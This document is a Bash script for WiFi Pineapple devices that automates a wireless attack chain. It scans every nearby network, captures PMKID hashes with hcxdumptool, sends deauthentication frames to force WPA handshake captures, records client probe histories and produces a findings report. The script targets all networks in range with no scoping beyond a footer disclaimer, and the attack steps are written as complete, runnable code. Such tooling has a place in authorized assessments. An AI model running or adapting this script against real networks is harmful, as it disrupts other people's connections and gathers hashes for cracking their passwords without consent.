#!/bin/bash
###############################################################################
# SpecOps — Multi-Vector Wireless Penetration Test Automation
# NullSec Suite | WiFi Pineapple Mark VII / Nano / Tetra
#
# Orchestrates a full wireless penetration test lifecycle:
# Phase 1: Reconnaissance (passive scanning, client profiling)
# Phase 2: Enumeration (service discovery, vulnerability mapping)
# Phase 3: Exploitation (automated attack selection & execution)
# Phase 4: Post-exploitation (credential harvesting, lateral movement probes)
# Phase 5: Reporting (executive summary, risk matrix, remediation)
#
# Author : bad-antics (NullSec)
# Version: 1.0.0
# License: MIT
###############################################################################

PAYLOAD_DIR="/root/payloads/SpecOps"
LOOT_DIR="/root/loot/specops"
LOG_FILE="$LOOT_DIR/specops.log"
REPORT_FILE="$LOOT_DIR/specops_report.html"
FINDINGS_FILE="$LOOT_DIR/findings.csv"
TARGETS_FILE="$LOOT_DIR/targets.csv"
IFACE=""
ENGAGEMENT_ID=""

RED='\033[0;31m'; GRN='\033[0;32m'; YEL='\033[1;33m'
CYN='\033[0;36m'; MAG='\033[0;35m'; BLD='\033[1m'; RST='\033[0m'

log()  { echo -e "[$(date '+%H:%M:%S')] $*" | tee -a "$LOG_FILE"; }
ok()   { log "${GRN}[✓]${RST} $*"; }
warn() { log "${YEL}[!]${RST} $*"; }
fail() { log "${RED}[✗]${RST} $*"; }
info() { log "${CYN}[i]${RST} $*"; }
phase(){ log "${MAG}[PHASE]${RST} ${BLD}$*${RST}"; }

banner() {
    echo -e "${MAG}"
    cat << 'EOF'
  ____                   ___
 / ___| _ __   ___  ___ / _ \ _ __  ___
 \___ \| '_ \ / _ \/ __| | | | '_ \/ __|
  ___) | |_) |  __/ (__| |_| | |_) \__ \
 |____/| .__/ \___|\___|\___/| .__/|___/
       |_|                   |_|
  NullSec Wireless Pentest Automation
EOF
    echo -e "${RST}"
}

preflight() {
    ENGAGEMENT_ID="SPECOPS-$(date '+%Y%m%d-%H%M')"
    mkdir -p "$LOOT_DIR/$ENGAGEMENT_ID"
    LOOT_DIR="$LOOT_DIR/$ENGAGEMENT_ID"
    LOG_FILE="$LOOT_DIR/specops.log"
    REPORT_FILE="$LOOT_DIR/specops_report.html"
    FINDINGS_FILE="$LOOT_DIR/findings.csv"
    TARGETS_FILE="$LOOT_DIR/targets.csv"
    > "$LOG_FILE"
    echo "id,severity,category,target,finding,evidence,remediation,cvss" > "$FINDINGS_FILE"
    echo "bssid,essid,channel,encryption,cipher,auth,power,clients,wps,risk_score" > "$TARGETS_FILE"

    IFACE=$(iw dev 2>/dev/null | awk '/Interface/{print $2}' | head -1)
    [ -z "$IFACE" ] && { fail "No wireless interface"; exit 1; }
    ok "Engagement: $ENGAGEMENT_ID"
    ok "Interface: $IFACE"
}

FINDING_ID=0
add_finding() {
    ((FINDING_ID++))
    local sev="$1" cat="$2" target="$3" finding="$4" evidence="$5" remediation="$6" cvss="$7"
    echo "$FINDING_ID,$sev,$cat,$target,\"$finding\",\"$evidence\",\"$remediation\",$cvss" >> "$FINDINGS_FILE"
}

# ═══════════════════════════════════════════════════════════════════════════
# PHASE 1: RECONNAISSANCE
# ═══════════════════════════════════════════════════════════════════════════
phase1_recon() {
    phase "1 — RECONNAISSANCE"
    info "Passive wireless reconnaissance..."

    airmon-ng start "$IFACE" &>/dev/null
    local mon="${IFACE}mon"
    [ ! -d "/sys/class/net/$mon" ] && mon="$IFACE"

    # Long passive scan
    local scan_prefix="$LOOT_DIR/recon"
    timeout 90 airodump-ng "$mon" --wps --output-format csv -w "$scan_prefix" 2>/dev/null &
    local pid=$!
    local e=0
    while [ $e -lt 85 ] && kill -0 $pid 2>/dev/null; do
        printf "\r  Scanning... %d/90s  " $e; sleep 5; ((e+=5))
    done; echo ""
    kill $pid 2>/dev/null; wait $pid 2>/dev/null

    # Parse targets
    local ap_count=0
    if [ -f "${scan_prefix}-01.csv" ]; then
        while IFS=',' read -r bssid first last ch sp priv cipher auth pwr bcn iv lip idlen essid rest; do
            bssid=$(echo "$bssid" | xargs); essid=$(echo "$essid" | xargs)
            ch=$(echo "$ch" | xargs); priv=$(echo "$priv" | xargs)
            auth=$(echo "$auth" | xargs); pwr=$(echo "$pwr" | xargs)
            [[ "$bssid" == "BSSID" ]] && continue
            [[ "$bssid" == "Station"* ]] && break
            [ -z "$bssid" ] && continue

            # Risk scoring
            local risk=0
            [[ "$priv" == *"OPN"* ]] && risk=$((risk + 30))
            [[ "$priv" == *"WEP"* ]] && risk=$((risk + 40))
            [[ "$priv" == *"WPA "* ]] && [[ "$priv" != *"WPA2"* ]] && risk=$((risk + 25))
            [[ "$auth" == *"PSK"* ]] && risk=$((risk + 10))
            [[ "$auth" == *"MGT"* ]] && risk=$((risk + 5))

            # Check WPS
            local wps_status="N"
            # High power = more important target
            if [ -n "$pwr" ] && [ "$pwr" -gt -50 ] 2>/dev/null; then
                risk=$((risk + 10))
            fi

            echo "$bssid,$essid,$ch,$priv,$cipher,$auth,$pwr,0,$wps_status,$risk" >> "$TARGETS_FILE"
            ((ap_count++))
        done < "${scan_prefix}-01.csv"
    fi

    # Count clients
    local client_count=0
    local client_file="$LOOT_DIR/clients.csv"
    echo "mac,bssid,probes" > "$client_file"
    if [ -f "${scan_prefix}-01.csv" ]; then
        local in_clients=0
        while IFS=',' read -r f1 rest; do
            echo "$f1" | grep -q "Station MAC" && { in_clients=1; continue; }
            [ $in_clients -eq 0 ] && continue
            local mac=$(echo "$f1" | xargs)
            [ -z "$mac" ] && continue
            echo "$mac,$rest" >> "$client_file"
            ((client_count++))
        done < "${scan_prefix}-01.csv"
    fi

    airmon-ng stop "$mon" &>/dev/null 2>&1
    ok "Recon complete: $ap_count APs, $client_count clients"
}

# ═══════════════════════════════════════════════════════════════════════════
# PHASE 2: ENUMERATION
# ═══════════════════════════════════════════════════════════════════════════
phase2_enum() {
    phase "2 — ENUMERATION"

    local target_count=0
    while IFS=',' read -r bssid essid ch enc cipher auth pwr clients wps risk; do
        [ "$bssid" == "bssid" ] && continue
        ((target_count++))

        info "Enumerating: $essid ($bssid)"

        # Check for security weaknesses
        if [[ "$enc" == *"OPN"* ]]; then
            add_finding "critical" "encryption" "$essid" \
                "Open (unencrypted) wireless network" \
                "BSSID: $bssid, Channel: $ch" \
                "Enable WPA3-SAE or WPA2-AES encryption" "10.0"
        fi

        if [[ "$enc" == *"WEP"* ]]; then
            add_finding "critical" "encryption" "$essid" \
                "WEP encryption (trivially crackable)" \
                "BSSID: $bssid uses WEP" \
                "Upgrade to WPA3 or WPA2-AES immediately" "9.8"
        fi

        if [[ "$enc" == *"WPA "* ]] && [[ "$enc" != *"WPA2"* ]]; then
            add_finding "high" "encryption" "$essid" \
                "WPA1 (deprecated, vulnerable to TKIP attacks)" \
                "BSSID: $bssid uses WPA1" \
                "Upgrade to WPA2-AES or WPA3" "7.5"
        fi

        if [[ "$cipher" == *"TKIP"* ]]; then
            add_finding "medium" "cipher" "$essid" \
                "TKIP cipher suite (weak, deprecated)" \
                "BSSID: $bssid uses TKIP" \
                "Switch to AES/CCMP cipher" "5.3"
        fi

        if [[ "$auth" == *"PSK"* ]]; then
            add_finding "medium" "authentication" "$essid" \
                "Pre-shared key authentication (susceptible to offline cracking)" \
                "BSSID: $bssid uses PSK" \
                "Consider 802.1X/EAP for enterprise environments" "5.0"
        fi

        if [[ "$wps" == "Y" ]] || [[ "$wps" == "1" ]]; then
            add_finding "high" "wps" "$essid" \
                "WPS enabled (Reaver/Bully bruteforce possible)" \
                "BSSID: $bssid has WPS active" \
                "Disable WPS on all access points" "7.8"
        fi

    done < "$TARGETS_FILE"

    ok "Enumeration complete: $target_count targets assessed"
}

# ═══════════════════════════════════════════════════════════════════════════
# PHASE 3: EXPLOITATION (non-destructive verification)
# ═══════════════════════════════════════════════════════════════════════════
phase3_exploit() {
    phase "3 — EXPLOITATION VERIFICATION"
    info "Verifying vulnerabilities (non-destructive)..."

    airmon-ng start "$IFACE" &>/dev/null
    local mon="${IFACE}mon"
    [ ! -d "/sys/class/net/$mon" ] && mon="$IFACE"

    # For each high-risk target, attempt PMKID capture
    while IFS=',' read -r bssid essid ch enc cipher auth pwr clients wps risk; do
        [ "$bssid" == "bssid" ] && continue
        [ "$risk" -lt 20 ] 2>/dev/null && continue

        info "Testing: $essid ($bssid) — Risk score: $risk"

        # PMKID capture attempt (passive, 15 seconds)
        if [[ "$enc" == *"WPA2"* ]] || [[ "$enc" == *"WPA"* ]]; then
            local pmkid_file="$LOOT_DIR/pmkid_${bssid//:/}.pcap"
            timeout 15 hcxdumptool -i "$mon" --filtermode=2 --filterlist_ap="$bssid" \
                -o "$pmkid_file" 2>/dev/null

            if [ -f "$pmkid_file" ] && [ -s "$pmkid_file" ]; then
                local pmkid_count
                pmkid_count=$(hcxpcapngtool "$pmkid_file" -o /dev/null 2>&1 | grep -c "PMKID" || true)
                if [ "$pmkid_count" -gt 0 ]; then
                    warn "✓ PMKID captured for $essid"
                    add_finding "high" "pmkid" "$essid" \
                        "PMKID hash captured (offline cracking possible)" \
                        "Captured $pmkid_count PMKID from $bssid" \
                        "Use strong >12 char passphrase; consider WPA3-SAE" "7.5"
                fi
            fi
        fi

        # Handshake capture via targeted deauth (single frame)
        if [[ "$enc" == *"WPA"* ]] && [ "$clients" -gt 0 ] 2>/dev/null; then
            local hs_file="$LOOT_DIR/handshake_${bssid//:/}"
            timeout 20 airodump-ng "$mon" --bssid "$bssid" -c "$ch" -w "$hs_file" 2>/dev/null &
            local dump_pid=$!
            sleep 3
            aireplay-ng --deauth 1 -a "$bssid" "$mon" &>/dev/null
            sleep 15
            kill $dump_pid 2>/dev/null; wait $dump_pid 2>/dev/null

            if [ -f "${hs_file}-01.cap" ]; then
                if aircrack-ng "${hs_file}-01.cap" 2>/dev/null | grep -q "1 handshake"; then
                    warn "✓ WPA handshake captured for $essid"
                    add_finding "high" "handshake" "$essid" \
                        "WPA handshake captured (dictionary attack possible)" \
                        "Handshake from $bssid" \
                        "Enforce complex passphrases; implement WIDS" "7.0"
                fi
            fi
        fi

    done < "$TARGETS_FILE"

    airmon-ng stop "$mon" &>/dev/null 2>&1
    ok "Exploitation verification complete"
}

# ═══════════════════════════════════════════════════════════════════════════
# PHASE 4: POST-EXPLOITATION ANALYSIS
# ═══════════════════════════════════════════════════════════════════════════
phase4_post() {
    phase "4 — POST-EXPLOITATION ANALYSIS"

    # Analyze captured data
    local handshake_count pmkid_count
    handshake_count=$(ls "$LOOT_DIR"/handshake_*.cap 2>/dev/null | wc -l)
    pmkid_count=$(ls "$LOOT_DIR"/pmkid_*.pcap 2>/dev/null | wc -l)

    info "Captured materials: $handshake_count handshakes, $pmkid_count PMKIDs"

    # Probe request analysis for client tracking
    local client_file="$LOOT_DIR/clients.csv"
    if [ -f "$client_file" ]; then
        local unique_probes
        unique_probes=$(tail -n +2 "$client_file" | awk -F',' '{print $NF}' | tr ',' '\n' | sort -u | grep -v "^$" | wc -l)
        if [ "$unique_probes" -gt 0 ]; then
            info "Extracted $unique_probes unique SSID probes (client history)"
            add_finding "info" "privacy" "All Clients" \
                "Client devices leak $unique_probes network names via probe requests" \
                "Probe request analysis of captured clients" \
                "Enable MAC randomization; disable auto-connect" "3.1"
        fi
    fi

    ok "Post-exploitation analysis complete"
}

# ═══════════════════════════════════════════════════════════════════════════
# PHASE 5: REPORTING
# ═══════════════════════════════════════════════════════════════════════════
phase5_report() {
    phase "5 — REPORT GENERATION"

    local total_findings critical high medium low info_count
    total_findings=$(tail -n +2 "$FINDINGS_FILE" 2>/dev/null | wc -l || echo 0)
    critical=$(grep -c ",critical," "$FINDINGS_FILE" 2>/dev/null || echo 0)
    high=$(grep -c ",high," "$FINDINGS_FILE" 2>/dev/null || echo 0)
    medium=$(grep -c ",medium," "$FINDINGS_FILE" 2>/dev/null || echo 0)
    low=$(grep -c ",low," "$FINDINGS_FILE" 2>/dev/null || echo 0)
    info_count=$(grep -c ",info," "$FINDINGS_FILE" 2>/dev/null || echo 0)
    local total_aps
    total_aps=$(tail -n +2 "$TARGETS_FILE" 2>/dev/null | wc -l || echo 0)

    # Calculate overall risk score
    local risk_score=$(( (critical * 40) + (high * 25) + (medium * 10) + (low * 3) ))
    local risk_rating="LOW"
    [ "$risk_score" -gt 30 ] && risk_rating="MEDIUM"
    [ "$risk_score" -gt 80 ] && risk_rating="HIGH"
    [ "$risk_score" -gt 150 ] && risk_rating="CRITICAL"

    cat > "$REPORT_FILE" << HTMLEOF
<!DOCTYPE html><html><head><meta charset="utf-8">
<title>SpecOps Pentest Report — $ENGAGEMENT_ID</title>
<style>
:root{--bg:#0a0e17;--card:#111827;--accent:#8b5cf6;--red:#ef4444;--org:#f97316;--yel:#eab308;--grn:#22c55e;--txt:#e0e0e0}
*{margin:0;padding:0;box-sizing:border-box}
body{background:var(--bg);color:var(--txt);font-family:'Segoe UI',system-ui,sans-serif;padding:24px}
h1{color:var(--accent);font-size:28px;margin-bottom:4px}
.meta{color:#888;margin-bottom:24px;font-size:14px;line-height:1.8}
.grid{display:grid;grid-template-columns:repeat(5,1fr);gap:12px;margin-bottom:32px}
.card{background:var(--card);border-radius:12px;padding:18px;text-align:center;border:1px solid #222}
.card .n{font-size:36px;font-weight:700}
.card .l{font-size:12px;color:#888;margin-top:4px}
.c-crit .n{color:var(--red)}.c-high .n{color:var(--org)}.c-med .n{color:var(--yel)}.c-low .n{color:var(--grn)}.c-info .n{color:#888}
.risk-box{background:var(--card);border-radius:12px;padding:24px;text-align:center;margin-bottom:32px;border:2px solid}
.risk-CRITICAL{border-color:var(--red)}.risk-CRITICAL .risk-label{color:var(--red)}
.risk-HIGH{border-color:var(--org)}.risk-HIGH .risk-label{color:var(--org)}
.risk-MEDIUM{border-color:var(--yel)}.risk-MEDIUM .risk-label{color:var(--yel)}
.risk-LOW{border-color:var(--grn)}.risk-LOW .risk-label{color:var(--grn)}
.risk-label{font-size:48px;font-weight:800}
.risk-sub{color:#888;font-size:14px;margin-top:4px}
h2{color:var(--accent);margin:24px 0 12px;font-size:20px}
table{width:100%;border-collapse:collapse;background:var(--card);border-radius:12px;overflow:hidden;margin-bottom:24px}
th{background:#1a2332;color:var(--accent);padding:12px 16px;text-align:left;font-size:12px;text-transform:uppercase}
td{padding:10px 16px;border-bottom:1px solid #1a1a2e;font-size:13px}
.sev-critical{color:var(--red);font-weight:bold}
.sev-high{color:var(--org);font-weight:bold}
.sev-medium{color:var(--yel)}
.sev-low{color:var(--grn)}
.sev-info{color:#888}
.exec-summary{background:var(--card);border-radius:12px;padding:24px;margin-bottom:24px;line-height:1.8;border:1px solid #222}
.footer{margin-top:32px;text-align:center;color:#555;font-size:12px}
</style></head><body>

<h1>🎯 SpecOps — Wireless Penetration Test Report</h1>
<div class="meta">
<strong>Engagement:</strong> $ENGAGEMENT_ID<br>
<strong>Date:</strong> $(date -u '+%Y-%m-%d %H:%M UTC')<br>
<strong>Scope:</strong> All wireless networks within range of test device<br>
<strong>Methodology:</strong> OWASP Wireless Security Testing Guide + PTES Wireless
</div>

<div class="risk-box risk-$risk_rating">
<div class="risk-label">$risk_rating</div>
<div class="risk-sub">Overall Risk Assessment (Score: $risk_score)</div>
</div>

<div class="grid">
<div class="card c-crit"><div class="n">$critical</div><div class="l">Critical</div></div>
<div class="card c-high"><div class="n">$high</div><div class="l">High</div></div>
<div class="card c-med"><div class="n">$medium</div><div class="l">Medium</div></div>
<div class="card c-low"><div class="n">$low</div><div class="l">Low</div></div>
<div class="card c-info"><div class="n">$info_count</div><div class="l">Info</div></div>
</div>

<h2>📋 Executive Summary</h2>
<div class="exec-summary">
During this wireless security assessment, <strong>$total_aps access points</strong> were identified and evaluated.
The assessment revealed <strong>$total_findings findings</strong> across the wireless infrastructure, including
<strong>$critical critical</strong> and <strong>$high high-severity</strong> issues that require immediate attention.
<br><br>
Key concerns include the use of deprecated encryption protocols, weak authentication mechanisms,
and potential for offline credential attacks via captured handshakes/PMKIDs.
Remediation priorities should focus on eliminating open and WEP-encrypted networks,
disabling WPS, and implementing WPA3-SAE where possible.
</div>

<h2>🔍 Detailed Findings</h2>
<table><thead><tr><th>#</th><th>Severity</th><th>Category</th><th>Target</th><th>Finding</th><th>CVSS</th><th>Remediation</th></tr></thead><tbody>
HTMLEOF

    tail -n +2 "$FINDINGS_FILE" 2>/dev/null | while IFS=',' read -r id sev cat target finding evidence remed cvss; do
        finding=$(echo "$finding" | tr -d '"')
        remed=$(echo "$remed" | tr -d '"')
        echo "<tr><td>$id</td><td class=\"sev-$sev\">$sev</td><td>$cat</td><td>$target</td><td>$finding</td><td>$cvss</td><td>$remed</td></tr>" >> "$REPORT_FILE"
    done

    cat >> "$REPORT_FILE" << 'HTMLEOF'
</tbody></table>

<h2>📡 Scanned Access Points</h2>
<table><thead><tr><th>BSSID</th><th>ESSID</th><th>Channel</th><th>Encryption</th><th>Auth</th><th>Risk</th></tr></thead><tbody>
HTMLEOF

    tail -n +2 "$TARGETS_FILE" 2>/dev/null | sort -t',' -k10 -rn | while IFS=',' read -r bssid essid ch enc cipher auth pwr clients wps risk; do
        local cls=""
        [ "$risk" -gt 25 ] && cls="sev-critical"
        [ "$risk" -le 25 ] && [ "$risk" -gt 15 ] && cls="sev-high"
        [ "$risk" -le 15 ] && [ "$risk" -gt 5 ] && cls="sev-medium"
        [ "$risk" -le 5 ] && cls="sev-low"
        echo "<tr><td><code>$bssid</code></td><td>$essid</td><td>$ch</td><td>$enc</td><td>$auth</td><td class=\"$cls\">$risk</td></tr>" >> "$REPORT_FILE"
    done

    cat >> "$REPORT_FILE" << 'HTMLEOF'
</tbody></table>
<div class="footer">SpecOps v1.0.0 — NullSec Suite — For authorized penetration testing only</div>
</body></html>
HTMLEOF

    ok "Report: $REPORT_FILE"
    info "Findings: $critical critical, $high high, $medium medium"
    info "Overall risk: $risk_rating (score: $risk_score)"
}

LED() { command -v LED &>/dev/null && command LED "$@" 2>/dev/null; true; }

# ── Full automated pentest ─────────────────────────────────────────────────
full_pentest() {
    phase1_recon
    phase2_enum
    phase3_exploit
    phase4_post
    phase5_report
    ok "═══ SpecOps engagement complete ═══"
}

# ── Menu ───────────────────────────────────────────────────────────────────
show_menu() {
    while true; do
        echo ""
        echo -e "${MAG}╔═══════════════════════════════════════════════╗${RST}"
        echo -e "${MAG}║     SpecOps — Pentest Automation              ║${RST}"
        echo -e "${MAG}╠═══════════════════════════════════════════════╣${RST}"
        echo -e "${MAG}║${RST} [1] Full Automated Pentest (all phases)      ${MAG}║${RST}"
        echo -e "${MAG}║${RST} [2] Phase 1: Reconnaissance                  ${MAG}║${RST}"
        echo -e "${MAG}║${RST} [3] Phase 2: Enumeration                     ${MAG}║${RST}"
        echo -e "${MAG}║${RST} [4] Phase 3: Exploitation Verification       ${MAG}║${RST}"
        echo -e "${MAG}║${RST} [5] Phase 4: Post-Exploitation Analysis      ${MAG}║${RST}"
        echo -e "${MAG}║${RST} [6] Phase 5: Generate Report                 ${MAG}║${RST}"
        echo -e "${MAG}║${RST} [7] View Findings                            ${MAG}║${RST}"
        echo -e "${MAG}║${RST} [8] View Target List                         ${MAG}║${RST}"
        echo -e "${MAG}║${RST} [0] Exit                                     ${MAG}║${RST}"
        echo -e "${MAG}╚═══════════════════════════════════════════════╝${RST}"
        echo ""
        read -rp "Select> " choice

        case "$choice" in
            1) full_pentest ;;
            2) phase1_recon ;;
            3) phase2_enum ;;
            4) phase3_exploit ;;
            5) phase4_post ;;
            6) phase5_report ;;
            7) column -t -s',' "$FINDINGS_FILE" 2>/dev/null ;;
            8) column -t -s',' "$TARGETS_FILE" 2>/dev/null ;;
            0) ok "Exiting SpecOps"; exit 0 ;;
            *) warn "Invalid" ;;
        esac
    done
}

main() {
    banner
    preflight
    case "$1" in
        --auto)   full_pentest ;;
        --recon)  phase1_recon ;;
        --report) phase5_report ;;
        *)        show_menu ;;
    esac
}

main "$@"
